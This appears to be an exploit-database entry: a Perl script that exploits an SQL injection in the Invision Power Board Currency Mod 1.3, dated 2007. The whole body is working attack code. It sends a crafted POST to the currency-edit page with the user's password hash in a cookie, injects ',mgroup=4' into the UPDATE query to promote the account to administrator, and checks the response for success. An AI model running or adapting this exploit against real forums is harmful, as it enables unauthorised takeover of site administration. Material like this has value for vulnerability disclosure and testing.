# Exploit Title: Invision Power Board Currency Mod(edit) SQL injection
# Date: 17/04/2007
# Author: Pr0T3cT10n
# Software Link: www.invisionpower.com<http://www.invisionpower.com>
# Version: 1.3
# Tested on: 1.3
# CVE:
# Code:
#!/usr/bin/perl
#########################################################################
# Invision Power Board Currency Mod(edit) SQL injection. #
# Bug found by Pr0T3cT10n, pr0t3ct10n@gmail.com<mailto:pr0t3ct10n@gmail.com> #
# The exploit is updating your user to an admin account #
# **YOU SHOULD HAVE CURRENCY EDIT ACCESS!** #
#########################################################################
use IO::Socket;
use Digest::MD5 qw(md5_hex);

$host = $ARGV[0];
$path = $ARGV[1];
$id = $ARGV[2];
$passwd = $ARGV[3];

if(!$ARGV[3])
{
print "#################################################\n";
print "## IPB Currency Mod SQL injection Exploit. ##\n";
print "## Discoverd By Pr0T3cT10n. ##\n";
print "#################################################\n";
print "$0 [host] [path] [your id] [your passowrd]\n";
print "$0 host.com /forum 567 123456\n";
print "#################################################\n";
exit();
}
print "[~] Connecting $host:80...\n";
$socket = IO::Socket::INET->new(
Proto => "tcp" ,
PeerAddr => $host ,
PeerPort => "80") or die("[-] Connection faild.\n");
print "[+] Connected.\n[~] Sending POST information...\n";
$pack.= "POST " . $path . "/index.php?act=modcp&CODE=docurrencyedit&memberid=" . $id . " HTTP/1.1\r\n";
$pack.= "Host: " . $host . "\r\n";
$pack.= "User-Agent: No_Agent\r\n";
$pack.= "Accept: */*\r\n";
$pack.= "Cookie: member_id=" .$id. "; pass_hash=" .md5_hex($passwd). "\r\n";
$pack.= "Keep-Alive: 300\r\n";
$pack.= "Connection: keep-alive\r\n";
$pack.= "Content-Type: application/x-www-form-urlencoded\r\n";
$pack.= "Content-Length: 24\r\n\r\n";
$pack.= "currency=1%20%2Cmgroup=4"; #UPDATE ibf_members SET currency=1 ,mgroup=4 WHERE id='$id'

print $socket $pack;

while($res = <$socket>)
{
if($res =~ /<table align='center' cellpadding="4" class="tablefill">/)
{
print("[+] succeed.\n");
exit();
}
}
print("[-] Faild.\n");
exit();